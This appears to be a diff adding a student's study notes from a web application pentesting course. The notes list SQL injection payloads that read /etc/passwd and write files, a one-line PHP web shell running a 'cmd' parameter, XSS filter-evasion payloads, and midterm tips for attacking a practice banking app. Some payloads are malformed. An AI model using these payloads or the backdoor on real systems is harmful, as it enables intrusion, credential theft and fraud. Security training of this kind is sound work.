@@ -1,0 +1,62 @@
+SQLi Notes 
+
+' UNION SELECT 'a', LOAD_FILE('/etc/passwd'), ...
+
+SQL command to write files -> OUT_FILE -> Write to a directory that you can view in browser. Exfiltrate source code files
+
+If we can write php files, do so to create php backdoor
+
+Takes contents of cmd parameter and run them
+REQUEST gets GET and POST
+<?php if(isset($_REQUEST["cmd"])) { $cmd = ($_REQUEST["cmd"]); echo "$cmd<br />; system($cmd); die;"  ?>
+
+XSS Homework Review
+
+<SCRIPT>
+<scriptscriptscript></scriptscriptscript>
+<img src="0" onerror="js" />
+<img/src=0/onerror="js"/>
+'><img/onerror="alert(0);"src=0/>
+<body.onload=alert(0)>
+<img%09onerror='alert(0)>
+<object data=""/>
+Many tags on onfocus, not span
+' onmouseover='eval(String.fromCharCode(ascii ascii ascii));"
+
+Can put information on the hashtag, which server ignores. Then JS can access the hashtag information
+Can still send payload and not bounce it against server, because server dont read fragment
+
+Javascript understands these.
+\x3c <
+\x3e >
+\u003c
+\u003e
+
+\x3cscript\x3ealert(0);\x3c/scrip\x3e"
+
+13. script style eval on --- No allowed, use HTML encoding
+
+iframe src="text/html;base64, iosdguirCODE23425uib==">
+src="java:&#99;cript:alert(0);"
+
+15. Gets rid of everything: js fuck js hieroglyphs 
+
+javascript with only brackets
+
+midterm:
+https://54.237.142.159/SuperSecureBank-Java/index.jsp
+
+--FOCUS--
+XSS, SQLi, CSRF, and business Logic flaws
+
+Focus on one at a time. Web-Application pentest is meant to audit all the functionality
+
+First thing to look for: XSS <-- less likely to knock things down
+Set up BURP for doing midterm
+Also, look for hidden fields
+FIREFOX
+
+Transfering money from accounts you dont own
+Transfering money to/from still pending accounts
+
+3 best business logic
